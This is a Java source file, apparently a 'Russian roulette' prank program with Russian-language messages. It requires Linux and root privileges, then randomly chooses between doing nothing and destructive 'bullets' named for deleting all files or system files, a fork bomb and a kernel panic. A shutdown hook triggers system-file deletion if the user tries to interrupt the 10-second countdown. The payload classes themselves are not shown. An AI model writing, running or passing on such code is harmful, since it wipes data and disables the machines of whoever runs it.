import bullets.*;
import lombok.NonNull;

import java.io.IOException;
import java.util.Random;

public class Main {
    public static void main(String[] args) throws IOException {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (!os.contains("linux")) {
                System.err.println("❌ Ошибка: Программа работает только в Linux!");
                System.err.println("Текущая ОС: " + System.getProperty("os.name"));
                System.exit(1);
            }

            try {
                ProcessBuilder checkRoot = new ProcessBuilder("id", "-u");
                Process process = checkRoot.start();
                int exitCode = process.waitFor();

                if (exitCode != 0) {
                    System.err.println("❌ Ошибка: Не удалось проверить права пользователя!");
                    System.exit(1);
                }

                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream())
                );
                String uid = reader.readLine();

                if (!"0".equals(uid)) {
                    System.err.println("❌ Ошибка: Программа должна быть запущена от root!");
                    System.err.println("Текущий UID: " + uid);
                    System.exit(1);
                }

            } catch (IOException | InterruptedException e) {
                System.err.println("❌ Ошибка при проверке прав: " + e.getMessage());
                System.exit(1);
            }

            Bullet current = getRandom();

            System.out.println("Ваша пуля: " + current.getName() + ".");
            System.out.println("Описание: " + current.getDescription() + ".");
            System.out.println("Применение через 10 секунд.");
            boolean[] clearShot = {false};
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                if (!clearShot[0]) {
                    System.out.println("\n🚫 Не так просто! Попытка побега зафиксирована.");
                    System.out.println("💥 Окирпичиваем компьютер...");
                    try {
                        new RmRfSys().shot();
                    } catch (Exception ignored) {
                    }
                }
            }));
            Thread.sleep(10000);
            clearShot[0] = true;
            System.out.println("\nБегите, глупцы!");
            current.shot();
        } catch (InterruptedException e) {
            System.out.println("Не так просто. Окирпичиваем компьютер.");
            new RmRfSys().shot();
        }
    }

    private static @NonNull Bullet getRandom() {
        Random rnd = new Random();

        if (rnd.nextBoolean()) return new NoAction();
        else {
            short result = (short) rnd.nextInt(0, 100);
            if (result < 14) return new RmRfAllAndSys();
            else if (result < 48) return new ForkBomb();
            else if (result < 66) return new RmRfAll();
            else if (result < 80) return new RmRfSys();
            else if (result < 86) return getRandom();
            else return new KernelPanic();
        }
    }
}